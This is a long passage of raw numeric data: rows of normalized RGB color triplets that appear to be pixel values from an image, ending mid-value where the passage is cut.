{0.616,0.329,0.255},{0.639,0.357,0.278},{0.651,0.373,0.286},{0.667,0.392,0.294},{0.675,0.392,0.294},{0.675,0.373,0.282},{0.698,0.396,0.302},{0.722,0.42,0.325},{0.729,0.42,0.325},{0.753,0.451,0.361},{0.773,0.482,0.404},{0.769,0.443,0.369},{0.82,0.553,0.514},{0.816,0.533,0.506},{0.824,0.545,0.506},{0.831,0.584,0.525},{0.878,0.78,0.745},{0.812,0.616,0.549},{0.918,0.71,0.604},{0.98,0.804,0.706},{0.984,0.812,0.722},{0.984,0.808,0.714},{0.98,0.792,0.706},{0.98,0.784,0.694},{0.965,0.773,0.69},{0.882,0.761,0.745},{0.859,0.741,0.749},{0.706,0.588,0.608},{0.706,0.588,0.608},{0.706,0.596,0.612},{0.706,0.592,0.608},{0.69,0.573,0.588},{0.686,0.569,0.58},{0.686,0.565,0.58},{0.663,0.541,0.553},{0.663,0.541,0.549},{0.663,0.541,0.553},{0.667,0.545,0.553},{0.663,0.541,0.549},{0.663,0.541,0.553},{0.663,0.537,0.549},{0.663,0.537,0.549},{0.667,0.541,0.553},{0.667,0.541,0.549},{0.682,0.557,0.565},{0.702,0.584,0.592},{0.714,0.596,0.604},{0.694,0.573,0.584},{0.698,0.576,0.588},{0.729,0.612,0.62},{0.718,0.6,0.608},{0.722,0.604,0.612},{0.714,0.596,0.604},
{0.682,0.561,0.561},{0.702,0.58,0.584},{0.725,0.612,0.616},{0.718,0.6,0.612},{0.718,0.6,0.608},{0.737,0.62,0.624},{0.745,0.627,0.635},{0.745,0.635,0.639},{0.718,0.627,0.6},{0.627,0.408,0.322},{0.639,0.396,0.294},{0.643,0.396,0.286},{0.643,0.392,0.29},{0.651,0.408,0.298},{0.647,0.404,0.294},{0.655,0.416,0.31},{0.663,0.431,0.318},{0.663,0.427,0.31},{0.671,0.435,0.318},{0.69,0.455,0.341},{0.698,0.471,0.361},{0.718,0.482,0.369},{0.733,0.49,0.376},{0.745,0.502,0.388},{0.753,0.514,0.396},{0.769,0.529,0.416},{0.773,0.537,0.424},{0.776,0.541,0.427},{0.788,0.541,0.435},{0.784,0.533,0.424},{0.78,0.518,0.412},{0.776,0.498,0.396},{0.796,0.518,0.416},{0.824,0.537,0.439},{0.855,0.584,0.49},{0.871,0.6,0.502},{0.867,0.592,0.494},{0.875,0.612,0.506},{0.878,0.62,0.514},{0.859,0.6,0.498},{0.839,0.58,0.478},{0.847,0.592,0.494},{0.847,0.588,0.49},{0.847,0.588,0.498},{0.835,0.569,0.478},{0.827,0.553,0.467},{0.808,0.533,0.439},{0.773,0.471,0.384},{0.773,0.49,0.408},{0.784,0.522,0.431},{0.796,0.541,0.443},{0.816,0.561,0.463},{0.82,0.553,0.451},
{0.812,0.533,0.435},{0.788,0.506,0.412},{0.82,0.561,0.475},{0.855,0.596,0.51},{0.859,0.588,0.498},{0.827,0.525,0.443},{0.925,0.757,0.729},{0.945,0.796,0.804},{0.929,0.729,0.729},{0.933,0.71,0.698},{0.969,0.878,0.859},{0.945,0.835,0.808},{0.957,0.753,0.659},{0.98,0.816,0.722},{0.984,0.816,0.725},{0.984,0.816,0.725},{0.984,0.808,0.722},{0.984,0.804,0.714},{0.98,0.784,0.694},{0.929,0.776,0.729},{0.863,0.745,0.745},{0.702,0.588,0.604},{0.702,0.588,0.604},{0.702,0.588,0.604},{0.694,0.576,0.592},{0.682,0.561,0.58},{0.686,0.565,0.584},{0.69,0.573,0.588},{0.671,0.549,0.561},{0.659,0.541,0.549},{0.667,0.545,0.553},{0.659,0.537,0.549},{0.667,0.541,0.553},{0.671,0.549,0.557},{0.663,0.541,0.549},{0.675,0.549,0.561},{0.655,0.533,0.541},{0.655,0.533,0.541},{0.655,0.529,0.541},{0.659,0.537,0.545},{0.667,0.537,0.549},{0.671,0.545,0.549},{0.71,0.588,0.596},{0.718,0.604,0.612},{0.714,0.6,0.6},{0.718,0.6,0.608},{0.725,0.608,0.612},{0.714,0.596,0.604},{0.733,0.62,0.624},{0.745,0.635,0.643},{0.733,0.624,0.624},{0.729,0.616,0.624},{0.729,0.616,0.616},
{0.741,0.624,0.627},{0.737,0.639,0.631},{0.706,0.533,0.459},{0.749,0.51,0.388},{0.741,0.494,0.373},{0.725,0.478,0.361},{0.706,0.467,0.353},{0.698,0.459,0.345},{0.694,0.451,0.337},{0.71,0.467,0.349},{0.714,0.475,0.353},{0.714,0.475,0.353},{0.714,0.475,0.357},{0.714,0.478,0.365},{0.722,0.486,0.373},{0.718,0.486,0.373},{0.718,0.475,0.365},{0.729,0.478,0.369},{0.745,0.498,0.388},{0.753,0.51,0.388},{0.765,0.514,0.4},{0.78,0.529,0.416},{0.792,0.533,0.427},{0.804,0.549,0.439},{0.82,0.561,0.451},{0.835,0.58,0.471},{0.855,0.6,0.486},{0.855,0.588,0.478},{0.863,0.596,0.486},{0.867,0.596,0.49},{0.875,0.608,0.502},{0.882,0.62,0.506},{0.89,0.631,0.522},{0.89,0.635,0.525},{0.878,0.627,0.522},{0.89,0.643,0.537},{0.91,0.667,0.569},{0.914,0.675,0.588},{0.902,0.647,0.569},{0.875,0.62,0.541},{0.906,0.678,0.616},{0.871,0.604,0.51},{0.863,0.616,0.525},{0.886,0.643,0.557},{0.898,0.659,0.561},{0.91,0.678,0.584},{0.918,0.678,0.58},{0.91,0.663,0.561},{0.89,0.624,0.518},{0.886,0.608,0.51},{0.89,0.624,0.522},{0.898,0.639,0.545},{0.882,0.604,0.506},
{0.886,0.584,0.49},{0.922,0.659,0.588},{0.941,0.69,0.612},{0.945,0.714,0.62},{0.957,0.761,0.678},{0.973,0.773,0.682},{0.98,0.796,0.702},{0.98,0.804,0.714},{0.984,0.808,0.718},{0.984,0.812,0.722},{0.988,0.812,0.725},{0.984,0.804,0.714},{0.984,0.804,0.714},{0.976,0.792,0.714},{0.89,0.769,0.761},{0.698,0.584,0.6},{0.698,0.584,0.6},{0.714,0.604,0.62},{0.714,0.604,0.62},{0.686,0.569,0.588},{0.686,0.569,0.584},{0.69,0.569,0.588},{0.686,0.565,0.584},{0.667,0.549,0.561},{0.675,0.553,0.569},{0.678,0.561,0.573},{0.698,0.576,0.588},{0.702,0.588,0.596},{0.686,0.569,0.576},{0.667,0.549,0.557},{0.667,0.545,0.557},{0.655,0.529,0.541},{0.663,0.537,0.549},{0.667,0.545,0.553},{0.682,0.561,0.573},{0.702,0.584,0.592},{0.725,0.612,0.62},{0.741,0.635,0.643},{0.761,0.659,0.663},{0.761,0.663,0.671},{0.753,0.647,0.659},{0.745,0.635,0.643},{0.745,0.631,0.639},{0.749,0.643,0.647},{0.749,0.639,0.647},{0.749,0.631,0.639},{0.729,0.612,0.612},{0.733,0.616,0.624},{0.804,0.722,0.71},{0.78,0.592,0.494},{0.776,0.537,0.416},{0.765,0.529,0.404},{0.757,0.525,0.4},
{0.745,0.514,0.392},{0.737,0.506,0.388},{0.749,0.514,0.396},{0.753,0.514,0.388},{0.753,0.51,0.384},{0.749,0.506,0.384},{0.741,0.506,0.384},{0.729,0.49,0.373},{0.718,0.475,0.357},{0.714,0.467,0.349},{0.718,0.471,0.353},{0.729,0.486,0.369},{0.733,0.49,0.38},{0.757,0.51,0.392},{0.784,0.537,0.42},{0.804,0.553,0.435},{0.812,0.565,0.455},{0.824,0.58,0.467},{0.835,0.596,0.478},{0.847,0.6,0.486},{0.863,0.612,0.506},{0.863,0.624,0.51},{0.863,0.612,0.502},{0.863,0.608,0.498},{0.859,0.604,0.494},{0.863,0.604,0.494},{0.851,0.592,0.49},{0.835,0.569,0.486},{0.804,0.533,0.443},{0.729,0.424,0.337},{0.686,0.369,0.282},{0.69,0.396,0.325},{0.698,0.439,0.376},{0.714,0.486,0.431},{0.816,0.569,0.51},{0.875,0.616,0.533},{0.859,0.588,0.51},{0.796,0.522,0.435},{0.741,0.463,0.376},{0.725,0.455,0.361},{0.722,0.455,0.357},{0.725,0.459,0.357},{0.741,0.475,0.373},{0.757,0.502,0.392},{0.78,0.529,0.42},{0.804,0.553,0.447},{0.827,0.576,0.463},{0.847,0.6,0.486},{0.875,0.635,0.525},{0.902,0.667,0.561},{0.929,0.706,0.608},{0.953,0.741,0.647},{0.965,0.765,0.675},
{0.973,0.773,0.678},{0.98,0.788,0.694},{0.984,0.78,0.69},{0.984,0.784,0.69},{0.988,0.804,0.714},{0.988,0.816,0.725},{0.984,0.816,0.722},{0.988,0.812,0.722},{0.945,0.792,0.749},{0.702,0.588,0.604},{0.702,0.588,0.604},{0.694,0.576,0.596},{0.69,0.569,0.588},{0.694,0.576,0.596},{0.682,0.565,0.584},{0.686,0.565,0.584},{0.675,0.553,0.573},{0.682,0.561,0.58},{0.686,0.569,0.584},{0.698,0.576,0.592},{0.714,0.592,0.608},{0.725,0.612,0.627},{0.714,0.596,0.604},{0.698,0.58,0.588},{0.678,0.557,0.565},{0.667,0.545,0.553},{0.671,0.549,0.557},{0.686,0.565,0.576},{0.694,0.576,0.584},{0.718,0.604,0.612},{0.753,0.651,0.663},{0.776,0.678,0.686},{0.761,0.663,0.671},{0.745,0.647,0.655},{0.745,0.635,0.643},{0.741,0.627,0.635},{0.733,0.62,0.627},{0.737,0.624,0.631},{0.737,0.62,0.627},{0.741,0.624,0.631},{0.741,0.627,0.631},{0.729,0.612,0.616},{0.733,0.631,0.624},{0.765,0.584,0.498},{0.78,0.537,0.412},{0.792,0.553,0.424},{0.796,0.553,0.427},{0.788,0.557,0.431},{0.78,0.549,0.424},{0.776,0.541,0.424},{0.769,0.525,0.408},{0.769,0.522,0.4},{0.769,0.525,0.404},
{0.769,0.529,0.408},{0.773,0.525,0.404},{0.765,0.522,0.396},{0.761,0.506,0.388},{0.769,0.518,0.396},{0.769,0.518,0.4},{0.776,0.525,0.408},{0.784,0.549,0.431},{0.784,0.545,0.431},{0.792,0.561,0.455},{0.812,0.58,0.471},{0.82,0.584,0.471},{0.827,0.588,0.475},{0.835,0.596,0.486},{0.847,0.596,0.49},{0.843,0.584,0.475},{0.831,0.573,0.463},{0.827,0.545,0.439},{0.831,0.545,0.443},{0.831,0.557,0.455},{0.812,0.537,0.431},{0.776,0.502,0.404},{0.729,0.439,0.341},{0.655,0.341,0.247},{0.525,0.267,0.188},{0.439,0.247,0.18},{0.349,0.169,0.114},{0.255,0.102,0.067},{0.259,0.043,0.024},{0.275,0.039,0.016},{0.282,0.035,0.012},{0.298,0.039,0.012},{0.337,0.063,0.027},{0.361,0.082,0.039},{0.384,0.094,0.043},{0.412,0.118,0.063},{0.447,0.149,0.086},{0.498,0.208,0.137},{0.533,0.247,0.169},{0.565,0.282,0.196},{0.6,0.318,0.239},{0.635,0.365,0.278},{0.663,0.396,0.31},{0.698,0.439,0.349},{0.725,0.467,0.376},{0.761,0.518,0.424},{0.804,0.557,0.463},{0.851,0.608,0.514},{0.898,0.667,0.569},{0.953,0.737,0.643},{0.984,0.78,0.682},{0.992,0.8,0.702},{0.992,0.812,0.718},
{0.988,0.82,0.729},{0.988,0.82,0.729},{0.98,0.796,0.714},{0.69,0.573,0.592},{0.69,0.573,0.592},{0.686,0.565,0.584},{0.69,0.569,0.588},{0.698,0.576,0.596},{0.694,0.58,0.596},{0.678,0.557,0.576},{0.686,0.569,0.584},{0.694,0.573,0.592},{0.694,0.573,0.592},{0.698,0.58,0.596},{0.725,0.612,0.627},{0.725,0.62,0.631},{0.722,0.608,0.62},{0.686,0.565,0.58},{0.675,0.553,0.565},{0.682,0.557,0.569},{0.69,0.573,0.58},{0.698,0.58,0.588},{0.706,0.588,0.596},{0.729,0.62,0.627},{0.765,0.667,0.678},{0.765,0.667,0.678},{0.769,0.671,0.682},{0.749,0.655,0.663},{0.749,0.643,0.655},{0.749,0.643,0.651},{0.745,0.635,0.643},{0.729,0.612,0.62},{0.722,0.604,0.612},{0.733,0.616,0.624},{0.737,0.624,0.627},{0.749,0.635,0.643},{0.737,0.62,0.624},{0.757,0.624,0.569},{0.796,0.561,0.435},{0.816,0.584,0.459},{0.816,0.58,0.459},{0.812,0.576,0.451},{0.804,0.569,0.443},{0.784,0.549,0.427},{0.78,0.537,0.416},{0.78,0.545,0.42},{0.792,0.557,0.435},{0.808,0.573,0.455},{0.812,0.573,0.459},{0.804,0.557,0.443},{0.804,0.557,0.439},{0.808,0.569,0.447},{0.8,0.549,0.435},
{0.784,0.533,0.416},{0.788,0.541,0.427},{0.8,0.561,0.447},{0.816,0.573,0.463},{0.827,0.584,0.467},{0.835,0.584,0.471},{0.827,0.565,0.451},{0.82,0.549,0.439},{0.812,0.533,0.424},{0.812,0.522,0.42},{0.812,0.522,0.42},{0.831,0.537,0.455},{0.831,0.533,0.451},{0.839,0.557,0.459},{0.831,0.549,0.439},{0.808,0.541,0.427},{0.741,0.482,0.38},{0.463,0.427,0.373},{0.42,0.396,0.345},{0.42,0.404,0.349},{0.533,0.424,0.337},{0.518,0.231,0.153},{0.549,0.22,0.129},{0.533,0.188,0.114},{0.506,0.161,0.098},{0.447,0.125,0.075},{0.388,0.09,0.055},{0.329,0.063,0.031},{0.306,0.043,0.016},{0.318,0.051,0.012},{0.337,0.059,0.02},{0.353,0.075,0.035},{0.38,0.09,0.043},{0.4,0.102,0.055},{0.408,0.106,0.055},{0.404,0.106,0.059},{0.392,0.094,0.051},{0.412,0.114,0.067},{0.459,0.149,0.094},{0.51,0.192,0.129},{0.549,0.22,0.161},{0.616,0.275,0.208},{0.667,0.341,0.251},{0.686,0.361,0.263},{0.745,0.451,0.349},{0.871,0.635,0.533},{0.973,0.784,0.686},{0.988,0.824,0.733},{0.992,0.824,0.733},{0.988,0.808,0.722},{0.686,0.569,0.584},{0.686,0.569,0.584},{0.682,0.561,0.584},
{0.69,0.569,0.588},{0.682,0.561,0.584},{0.682,0.565,0.584},{0.682,0.561,0.58},{0.682,0.561,0.58},{0.69,0.569,0.588},{0.682,0.565,0.58},{0.686,0.565,0.58},{0.69,0.569,0.584},{0.694,0.576,0.592},{0.675,0.553,0.569},{0.663,0.541,0.553},{0.667,0.549,0.557},{0.686,0.569,0.576},{0.698,0.58,0.588},{0.718,0.604,0.616},{0.733,0.624,0.635},{0.745,0.643,0.655},{0.757,0.655,0.667},{0.753,0.655,0.667},{0.757,0.659,0.671},{0.753,0.655,0.667},{0.745,0.643,0.655},{0.749,0.647,0.655},{0.749,0.643,0.651},{0.745,0.631,0.639},{0.741,0.631,0.639},{0.733,0.624,0.631},{0.741,0.635,0.639},{0.757,0.651,0.655},{0.753,0.639,0.643},{0.741,0.631,0.631},{0.792,0.596,0.498},{0.831,0.608,0.486},{0.839,0.604,0.486},{0.839,0.604,0.486},{0.831,0.596,0.478},{0.816,0.573,0.459},{0.808,0.569,0.455},{0.812,0.576,0.463},{0.82,0.588,0.471},{0.827,0.6,0.482},{0.831,0.596,0.486},{0.827,0.592,0.478},{0.824,0.588,0.478},{0.827,0.588,0.478},{0.812,0.58,0.467},{0.796,0.573,0.463},{0.82,0.588,0.478},{0.835,0.592,0.478},{0.847,0.596,0.482},{0.863,0.624,0.51},{0.871,0.631,0.518},
{0.871,0.624,0.506},{0.867,0.608,0.498},{0.867,0.6,0.498},{0.875,0.6,0.498},{0.878,0.604,0.502},{0.89,0.62,0.525},{0.902,0.643,0.545},{0.902,0.643,0.549},{0.898,0.639,0.541},{0.882,0.627,0.529},{0.714,0.529,0.443},{0.525,0.616,0.557},{0.482,0.624,0.6},{0.443,0.49,0.463},{0.525,0.478,0.427},{0.702,0.435,0.333},{0.757,0.482,0.38},{0.714,0.404,0.31},{0.643,0.306,0.22},{0.6,0.251,0.169},{0.596,0.247,0.165},{0.616,0.278,0.188},{0.624,0.29,0.196},{0.616,0.286,0.196},{0.616,0.286,0.196},{0.62,0.29,0.204},{0.616,0.286,0.2},{0.62,0.286,0.2},{0.624,0.298,0.208},{0.627,0.306,0.216},{0.627,0.306,0.22},{0.635,0.318,0.235},{0.667,0.357,0.282},{0.686,0.376,0.302},{0.69,0.373,0.31},{0.741,0.471,0.427},{0.753,0.471,0.443},{0.78,0.506,0.471},{0.812,0.584,0.529},{0.878,0.765,0.729},{0.859,0.659,0.576},{0.984,0.831,0.741},{0.988,0.831,0.745},{0.988,0.816,0.725},{0.675,0.553,0.573},{0.675,0.553,0.573},{0.671,0.549,0.569},{0.678,0.557,0.576},{0.678,0.561,0.58},{0.678,0.557,0.576},{0.686,0.569,0.588},{0.69,0.569,0.588},{0.69,0.569,0.588},
{0.682,0.561,0.58},{0.686,0.565,0.584},{0.682,0.561,0.58},{0.675,0.557,0.569},{0.671,0.549,0.565},{0.667,0.545,0.557},{0.682,0.565,0.573},{0.694,0.576,0.588},{0.71,0.596,0.608},{0.729,0.616,0.627},{0.733,0.627,0.639},{0.749,0.647,0.659},{0.753,0.655,0.667},{0.757,0.659,0.671},{0.757,0.659,0.671},{0.741,0.643,0.655},{0.749,0.655,0.663},{0.757,0.655,0.667},{0.761,0.659,0.671},{0.753,0.643,0.655},{0.757,0.655,0.663},{0.757,0.659,0.667},{0.765,0.667,0.675},{0.765,0.667,0.667},{0.757,0.643,0.651},{0.729,0.616,0.62},{0.824,0.733,0.706},{0.812,0.604,0.49},{0.847,0.627,0.518},{0.855,0.631,0.522},{0.851,0.624,0.506},{0.839,0.616,0.498},{0.835,0.608,0.498},{0.835,0.608,0.494},{0.831,0.612,0.506},{0.839,0.616,0.51},{0.839,0.62,0.514},{0.835,0.612,0.506},{0.824,0.608,0.502},{0.816,0.604,0.498},{0.816,0.604,0.506},{0.831,0.608,0.51},{0.835,0.6,0.494},{0.835,0.6,0.49},{0.843,0.608,0.498},{0.847,0.608,0.502},{0.863,0.627,0.518},{0.875,0.635,0.525},{0.878,0.635,0.522},{0.886,0.639,0.529},{0.894,0.643,0.537},{0.902,0.647,0.537},{0.906,0.655,0.549},
{0.918,0.671,0.576},{0.91,0.667,0.565},{0.906,0.671,0.569},{0.906,0.667,0.565},{0.675,0.58,0.518},{0.51,0.502,0.455},{0.533,0.6,0.576},{0.616,0.784,0.773},{0.714,0.576,0.506},{0.886,0.651,0.549},{0.878,0.627,0.529},{0.863,0.612,0.518},{0.835,0.569,0.486},{0.792,0.514,0.431},{0.761,0.482,0.404},{0.769,0.502,0.424},{0.784,0.529,0.439},{0.792,0.541,0.451},{0.8,0.545,0.447},{0.804,0.553,0.459},{0.8,0.549,0.443},{0.796,0.545,0.443},{0.8,0.545,0.439},{0.8,0.541,0.447},{0.812,0.541,0.447},{0.8,0.498,0.42},{0.804,0.525,0.447},{0.784,0.502,0.424},{0.769,0.486,0.412},{0.875,0.698,0.69},{0.867,0.667,0.663},{0.878,0.667,0.659},{0.89,0.663,0.659},{0.945,0.843,0.827},{0.922,0.769,0.71},{0.98,0.82,0.729},{0.984,0.827,0.737},{0.984,0.812,0.729},{0.671,0.549,0.569},{0.671,0.549,0.569},{0.675,0.553,0.576},{0.678,0.557,0.576},{0.671,0.549,0.569},{0.671,0.549,0.569},{0.667,0.541,0.561},{0.682,0.561,0.58},{0.694,0.573,0.592},{0.69,0.569,0.588},{0.682,0.561,0.576},{0.682,0.561,0.58},{0.675,0.553,0.569},{0.686,0.565,0.58},{0.686,0.565,0.58},
{0.694,0.573,0.588},{0.718,0.6,0.612},{0.733,0.62,0.631},{0.737,0.631,0.647},{0.749,0.651,0.663},{0.749,0.651,0.663},{0.749,0.651,0.663},{0.753,0.655,0.667},{0.745,0.647,0.659},{0.745,0.647,0.659},{0.761,0.663,0.675},{0.757,0.659,0.671},{0.757,0.659,0.671},{0.753,0.647,0.663},{0.753,0.651,0.659},{0.761,0.663,0.671},{0.761,0.663,0.667},{0.753,0.647,0.659},{0.745,0.631,0.643},{0.725,0.608,0.616},{0.741,0.624,0.631},{0.8,0.682,0.651},{0.812,0.596,0.486},{0.824,0.608,0.49},{0.831,0.612,0.498},{0.831,0.616,0.498},{0.824,0.608,0.49},{0.82,0.604,0.494},{0.816,0.608,0.498},{0.808,0.592,0.486},{0.812,0.588,0.478},{0.812,0.584,0.475},{0.812,0.58,0.467},{0.82,0.584,0.471},{0.824,0.584,0.471},{0.824,0.588,0.478},{0.827,0.588,0.482},{0.831,0.596,0.49},{0.839,0.604,0.494},{0.859,0.624,0.514},{0.867,0.624,0.51},{0.875,0.631,0.529},{0.875,0.635,0.525},{0.871,0.639,0.525},{0.882,0.639,0.533},{0.89,0.647,0.541},{0.898,0.663,0.557},{0.898,0.663,0.561},{0.894,0.659,0.553},{0.886,0.647,0.545},{0.89,0.655,0.569},{0.835,0.616,0.541},{0.667,0.553,0.49},
{0.608,0.58,0.537},{0.698,0.671,0.631},{0.71,0.51,0.439},{0.937,0.733,0.647},{0.937,0.71,0.627},{0.922,0.675,0.592},{0.91,0.643,0.565},{0.922,0.694,0.627},{0.89,0.647,0.573},{0.878,0.62,0.541},{0.882,0.639,0.553},{0.886,0.671,0.596},{0.902,0.686,0.608},{0.918,0.706,0.627},{0.922,0.698,0.624},{0.914,0.69,0.608},{0.894,0.667,0.58},{0.89,0.655,0.573},{0.875,0.62,0.545},{0.878,0.616,0.537},{0.882,0.631,0.557},{0.867,0.608,0.522},{0.847,0.561,0.482},{0.906,0.71,0.675},{0.922,0.725,0.702},{0.941,0.725,0.678},{0.945,0.722,0.639},{0.965,0.788,0.714},{0.98,0.796,0.698},{0.98,0.812,0.722},{0.98,0.816,0.722},{0.984,0.808,0.722},{0.675,0.557,0.576},{0.675,0.557,0.576},{0.678,0.557,0.58},{0.686,0.565,0.584},{0.678,0.557,0.576},{0.671,0.549,0.569},{0.682,0.561,0.576},{0.69,0.569,0.588},{0.686,0.565,0.584},{0.686,0.573,0.588},{0.69,0.569,0.588},{0.686,0.565,0.584},{0.686,0.565,0.584},{0.678,0.557,0.576},{0.686,0.565,0.584},{0.694,0.576,0.592},{0.722,0.608,0.624},{0.737,0.624,0.639},{0.737,0.639,0.651},{0.745,0.647,0.659},{0.745,0.647,0.659},
{0.757,0.659,0.671},{0.765,0.667,0.682},{0.765,0.667,0.678},{0.757,0.659,0.671},{0.757,0.659,0.671},{0.753,0.655,0.667},{0.761,0.663,0.675},{0.749,0.639,0.655},{0.745,0.635,0.647},{0.749,0.639,0.647},{0.745,0.635,0.647},{0.741,0.627,0.639},{0.733,0.616,0.627},{0.729,0.616,0.624},{0.733,0.616,0.624},{0.737,0.62,0.624},{0.78,0.643,0.612},{0.816,0.6,0.482},{0.82,0.592,0.475},{0.816,0.6,0.478},{0.827,0.612,0.49},{0.827,0.604,0.482},{0.827,0.596,0.471},{0.827,0.592,0.471},{0.82,0.58,0.463},{0.827,0.58,0.455},{0.827,0.58,0.451},{0.831,0.573,0.451},{0.831,0.58,0.447},{0.835,0.58,0.447},{0.831,0.576,0.443},{0.831,0.573,0.447},{0.839,0.58,0.459},{0.851,0.592,0.475},{0.863,0.608,0.486},{0.875,0.624,0.498},{0.878,0.624,0.506},{0.886,0.635,0.525},{0.89,0.624,0.522},{0.898,0.639,0.533},{0.91,0.663,0.561},{0.914,0.671,0.573},{0.894,0.655,0.553},{0.882,0.635,0.529},{0.843,0.588,0.482},{0.804,0.541,0.439},{0.757,0.494,0.384},{0.702,0.447,0.349},{0.667,0.525,0.463},{0.71,0.537,0.459},{0.733,0.482,0.388},{0.765,0.514,0.431},{0.863,0.608,0.533},
{0.929,0.686,0.612},{0.949,0.737,0.682},{0.941,0.71,0.647},{0.925,0.682,0.608},{0.933,0.714,0.639},{0.937,0.722,0.639},{0.941,0.729,0.651},{0.941,0.722,0.639},{0.914,0.682,0.592},{0.894,0.651,0.565},{0.882,0.643,0.549},{0.878,0.635,0.533},{0.875,0.627,0.529},{0.878,0.62,0.514},{0.89,0.643,0.545},{0.906,0.671,0.565},{0.929,0.694,0.592},{0.953,0.733,0.635},{0.973,0.773,0.675},{0.976,0.78,0.69},{0.976,0.773,0.675},{0.98,0.773,0.675},{0.976,0.796,0.706},{0.98,0.808,0.718},{0.98,0.816,0.722},{0.98,0.804,0.71},{0.678,0.557,0.58},{0.678,0.557,0.58},{0.682,0.557,0.58},{0.682,0.561,0.584},{0.694,0.573,0.592},{0.686,0.565,0.584},{0.69,0.569,0.588},{0.678,0.557,0.576},{0.678,0.561,0.58},{0.686,0.569,0.588},{0.686,0.569,0.584},{0.682,0.561,0.58},{0.675,0.553,0.573},{0.678,0.557,0.576},{0.686,0.565,0.584},{0.686,0.569,0.584},{0.71,0.592,0.608},{0.729,0.62,0.635},{0.733,0.635,0.647},{0.741,0.643,0.655},{0.753,0.655,0.667},{0.753,0.655,0.667},{0.757,0.659,0.671},{0.753,0.651,0.663},{0.765,0.667,0.678},{0.765,0.667,0.678},{0.765,0.667,0.678},
{0.757,0.659,0.671},{0.753,0.647,0.659},{0.745,0.635,0.647},{0.741,0.631,0.643},{0.745,0.627,0.643},{0.745,0.635,0.647},{0.741,0.627,0.639},{0.733,0.616,0.624},{0.741,0.624,0.631},{0.741,0.624,0.631},{0.722,0.604,0.612},{0.753,0.588,0.541},{0.808,0.569,0.455},{0.812,0.58,0.463},{0.82,0.588,0.467},{0.82,0.584,0.459},{0.816,0.576,0.447},{0.816,0.569,0.443},{0.808,0.561,0.439},{0.812,0.569,0.447},{0.816,0.58,0.459},{0.82,0.58,0.463},{0.827,0.588,0.467},{0.827,0.588,0.467},{0.831,0.6,0.482},{0.827,0.596,0.478},{0.835,0.608,0.494},{0.839,0.604,0.494},{0.843,0.6,0.486},{0.863,0.616,0.498},{0.878,0.627,0.514},{0.886,0.639,0.529},{0.894,0.639,0.529},{0.894,0.639,0.529},{0.902,0.647,0.545},{0.914,0.659,0.561},{0.902,0.651,0.549},{0.902,0.663,0.569},{0.894,0.659,0.565},{0.878,0.643,0.545},{0.851,0.604,0.494},{0.824,0.565,0.455},{0.831,0.584,0.475},{0.82,0.584,0.478},{0.784,0.545,0.443},{0.757,0.471,0.369},{0.702,0.357,0.267},{0.694,0.329,0.239},{0.741,0.404,0.322},{0.765,0.439,0.361},{0.741,0.424,0.341},{0.682,0.365,0.29},{0.584,0.271,0.212},
{0.502,0.18,0.129},{0.443,0.118,0.071},{0.447,0.114,0.063},{0.459,0.137,0.078},{0.478,0.157,0.098},{0.494,0.18,0.114},{0.514,0.204,0.137},{0.541,0.224,0.153},{0.561,0.247,0.173},{0.616,0.298,0.22},{0.694,0.392,0.302},{0.792,0.498,0.404},{0.91,0.675,0.573},{0.976,0.788,0.694},{0.98,0.812,0.722},{0.98,0.808,0.718},{0.98,0.8,0.714},{0.98,0.812,0.722},{0.98,0.812,0.722},{0.98,0.8,0.71},{0.69,0.573,0.588},{0.69,0.573,0.588},{0.69,0.569,0.588},{0.678,0.553,0.576},{0.686,0.565,0.588},{0.682,0.561,0.58},{0.678,0.557,0.58},{0.686,0.565,0.588},{0.686,0.565,0.584},{0.675,0.553,0.565},{0.678,0.557,0.576},{0.678,0.557,0.573},{0.682,0.561,0.58},{0.698,0.576,0.596},{0.702,0.584,0.6},{0.694,0.573,0.592},{0.706,0.592,0.608},{0.733,0.624,0.635},{0.737,0.635,0.647},{0.741,0.643,0.655},{0.733,0.624,0.639},{0.745,0.639,0.655},{0.753,0.655,0.667},{0.753,0.655,0.667},{0.757,0.659,0.671},{0.765,0.667,0.678},{0.769,0.671,0.682},{0.757,0.659,0.671},{0.757,0.655,0.667},{0.749,0.647,0.663},{0.749,0.647,0.659},{0.745,0.635,0.651},{0.749,0.639,0.651},
{0.757,0.639,0.655},{0.749,0.639,0.651},{0.745,0.627,0.639},{0.745,0.627,0.639},{0.741,0.624,0.635},{0.745,0.631,0.639},{0.769,0.608,0.569},{0.82,0.588,0.478},{0.843,0.6,0.482},{0.831,0.58,0.455},{0.816,0.557,0.424},{0.804,0.549,0.416},{0.796,0.537,0.408},{0.788,0.533,0.404},{0.788,0.533,0.408},{0.788,0.541,0.416},{0.8,0.553,0.431},{0.812,0.565,0.439},{0.831,0.588,0.467},{0.839,0.6,0.482},{0.851,0.612,0.502},{0.863,0.627,0.518},{0.871,0.631,0.522},{0.875,0.627,0.518},{0.878,0.627,0.518},{0.882,0.639,0.537},{0.894,0.651,0.553},{0.902,0.647,0.557},{0.91,0.659,0.569},{0.914,0.675,0.584},{0.922,0.678,0.596},{0.922,0.69,0.6},{0.918,0.69,0.6},{0.91,0.682,0.584},{0.898,0.651,0.549},{0.902,0.647,0.541},{0.914,0.659,0.557},{0.918,0.675,0.58},{0.898,0.655,0.561},{0.871,0.612,0.525},{0.847,0.565,0.475},{0.82,0.522,0.431},{0.824,0.529,0.435},{0.831,0.545,0.447},{0.808,0.51,0.412},{0.769,0.463,0.361},{0.737,0.412,0.318},{0.714,0.38,0.282},{0.69,0.353,0.259},{0.686,0.337,0.243},{0.675,0.318,0.227},{0.659,0.298,0.208},{0.639,0.278,0.192},
{0.639,0.282,0.196},{0.639,0.29,0.204},{0.631,0.282,0.2},{0.651,0.306,0.243},{0.694,0.357,0.286},{0.71,0.357,0.275},{0.714,0.392,0.298},{0.804,0.549,0.451},{0.957,0.769,0.675},{0.98,0.831,0.737},{0.98,0.816,0.725},{0.98,0.804,0.714},{0.98,0.812,0.718},{0.984,0.804,0.71},{0.69,0.569,0.588},{0.69,0.569,0.588},{0.682,0.561,0.584},{0.675,0.553,0.576},{0.69,0.569,0.588},{0.69,0.569,0.588},{0.69,0.573,0.588},{0.694,0.573,0.592},{0.686,0.565,0.584},{0.682,0.565,0.584},{0.686,0.565,0.58},{0.682,0.561,0.576},{0.69,0.569,0.588},{0.69,0.569,0.588},{0.69,0.573,0.588},{0.69,0.569,0.588},{0.702,0.58,0.6},{0.725,0.612,0.627},{0.729,0.624,0.639},{0.741,0.631,0.647},{0.741,0.643,0.655},{0.741,0.639,0.651},{0.745,0.643,0.655},{0.749,0.651,0.663},{0.741,0.643,0.659},{0.